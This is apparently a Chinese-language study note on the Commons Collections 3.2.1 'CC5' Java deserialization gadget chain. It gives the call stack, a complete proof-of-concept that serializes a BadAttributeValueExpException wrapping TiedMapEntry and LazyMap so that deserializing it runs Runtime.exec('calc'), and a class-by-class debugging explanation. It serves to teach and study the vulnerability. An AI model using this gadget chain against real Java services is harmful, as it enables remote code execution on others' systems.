## CommonsCollections_5

本机环境：

JDK版本：jdk1.7u_51

CC版本：Commons-Collections 3.2.1

CC5 依旧是 LazyMap 加 ChainedTransformer 的触发模式，只不过不再使用 AnnotationInvocationHandler 的动态代理来触发 LazyMap 的 get ，而是找到了其他的方式。

因为 jdk 在 1.8 之后对 AnnotationInvocationHandler 类进行了修复，所以在 jdk 1.8 版本就必须找出能替代 AnnotationInvocationHandler 的新的可以利用的类。

调用栈：

```
 ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
```

## POC&复现

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;

public class CommonCollections5 {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException {
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"calc"})});
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
        TiedMapEntry tiedmap = new TiedMapEntry(map,123);
        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(poc,tiedmap);

        // ==================
        // 生成序列化字符串
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(poc);
        oos.close();

        // 本地测试触发
        // System.out.println(barr);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object) ois.readObject();

    }
}
```

![image-20220719140222744](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719140222744.png)

## 调试分析

### TiedMapEntry

`org.apache.commons.collections.keyvalue.TiedMapEntry` 是一个 `Map.Entry` 的实现类，从名称中可以看到，这是一个绑定了底层 map 的 Entry，用来使一个 map entry 对象拥有在底层修改 map 的功能。

TiedMapEntry 中有一个成员属性 Map，这就是 `Map.Entry` 的底层 map，TiedMapEntry 的 `getValue()` 方法会调用底层 map 的 `get()` 方法，我们可以用来触发 LazyMap 的 get。那谁会调用 `getValue()` 方法呢？我们发现 TiedMapEntry 的 equals/hashCode/toString 都可以触发。

![image-20220719112115405](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719112115405.png)

equals/hashCode 让我们想到了 URLDNS 的 HashMap，不过在 CC5 中我们用的是 `toString()` 方法。

接下来需要找到一个类在反序列化时会触发 TiedMapEntry 的 `toString()` 方法。

### BadAttributeValueExpException

于是找到了 `javax.management.BadAttributeValueExpException` 这个类，反序列化读取 val，当 `System.getSecurityManager() == null` 或 valObj 是除了 String 的其他基础类型时会调用 valObj 的 `toString()` 方法，完成上面 TiedMapEntry 的构造。

![image-20220719112431609](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220719112431609.png)

简单总结一下就是：

反序列化 BadAttributeValueExpException 调用 TiedMapEntry 的 toString 方法，间接调用了 LazyMap 的 get 方法，触发了后续的 Transformer 恶意执行链。

这里有个需要注意的地方，为什么创建BadAttributeValueExpException实例时不直接将构造好的TiedMapEntry传进去而要通过反射来修改val的值？

查看一下其构造方法：

```java
public BadAttributeValueExpException (Object val) {
        this.val = val == null ? null : val.toString();
    }
```

如果我们直接将前面构造好的TiedMapEntry传进去，在这里就会触发toString，从而导致rce。此时val的值为UNIXProcess，这是不可以被反序列化的，所以我们需要在不触发rce的前提，将val设置为构造好的TiedMapEntry。

